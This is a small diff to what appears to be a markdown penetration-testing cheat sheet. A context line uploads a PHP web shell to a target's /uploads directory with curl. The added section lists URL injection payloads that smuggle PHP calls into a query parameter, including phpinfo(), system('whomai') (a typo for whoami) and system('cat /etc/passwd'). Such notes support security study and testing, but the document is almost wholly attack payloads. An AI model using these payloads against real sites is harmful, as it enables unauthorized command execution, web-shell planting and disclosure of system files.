@@ -49,3 +49,9 @@
 ## [HTTP Method Tampering ](http_tampering.md)
   - __```curl http://<target_ip>/uploads --upload-file shell.php```__
 
+## Need to try in URL
+- __<url>?input=test;phpinfo()__
+- __<url>?input=test;system('whomai')__
+- __<url>?input=test;system('cat /etc/passwd')__
+
+
